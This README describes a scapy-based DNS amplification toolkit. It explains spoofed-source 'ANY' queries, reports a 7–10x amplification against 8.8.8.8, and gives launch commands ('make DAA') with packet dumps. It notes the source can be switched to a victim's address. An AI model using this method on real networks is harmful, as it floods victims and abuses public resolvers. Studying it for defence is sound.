DNS Amplification attack
===
contribute by < `ztex` >
[github-Dns-Amplification-Attack](https://github.com/tony2037/Dns-Amplification-Attack)
[hackmd](https://hackmd.io/s/rkOF6EJu4)

# How does it work ?
According to [DNS Amplification Attack](https://www.cloudflare.com/learning/ddos/dns-amplification-ddos-attack/) :

1. The attacker uses a compromised endpoint to send UDP packets with spoofed IP addresses to a DNS recursor. The spoofed address on the packets points to the real IP address of the victim.
2. Each one of the UDP packets makes a request to a DNS resolver, often passing an argument such as “ANY” in order to receive the largest response possible.
3. After receiving the requests, the DNS resolver, which is trying to be helpful by responding, sends a large response to the spoofed IP address.
4. The IP address of the target receives the response and the surrounding network infrastructure becomes overwhelmed with the deluge of traffic, resulting in a denial-of-service.

![](https://i.imgur.com/2LJ8JU4.png)

# Experience
## Explanation
In this experience, I firstly develop a toolkit base on **pathon scapy** which send a **UDP/IP** packet carry a **DNS** packet with **DNS Resource Record** packet.
The `destination` is `8.8.8.8`, which is well-known **google DNS server**.
In the experience phase, the `source address` is local, but can be easily change to `victim address` in attack phase.
- [ ] DAA.py
Used for lauching attack
- [ ] sniffer.py
Used for sniffing packet to varify

## Result
Sending: 70 bytes
Receiving: 500~ 700 bytes
Amplification is about 7 ~ 10 times

## Usage
### Build virtual environment
`virtualenv .`
### Install necessary packages
`pip3 install -r requirement`
### Lauch attack
`make DAA`
### Sniffing
`make sniffer`
### Snapshot
#### Send packet
```shell
         |###[ DNS Question Record ]### 
         |  qname     = 'qq.com'
         |  qtype     = ALL
         |  qclass    = IN
        an        = None
        ns        = None
        ar        = None

Are you sure you want to attack ? [Y]/NY
.
Sent 1 packets.
```
#### Sniffing
```shell
###[ IP ]### 
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 52
     id        = 1
     flags     = 
     frag      = 0
     ttl       = 64
     proto     = udp
     chksum    = 0x608a
     src       = 10.1.0.30
     dst       = 8.8.8.8
     \options   \
###[ UDP ]### 
        sport     = domain
        dport     = domain
        len       = 32
        chksum    = 0x9f30
###[ DNS ]### 
           id        = 0
           qr        = 0
           opcode    = QUERY
           aa        = 0
           tc        = 0
           rd        = 1
           ra        = 0
           z         = 0
           ad        = 0
           cd        = 0
           rcode     = ok
           qdcount   = 1
           ancount   = 0
           nscount   = 0
           arcount   = 0
           \qd        \
            |###[ DNS Question Record ]### 
            |  qname     = 'qq.com.'
            |  qtype     = ALL
            |  qclass    = IN
           an        = None
           ns        = None
           ar        = None
```
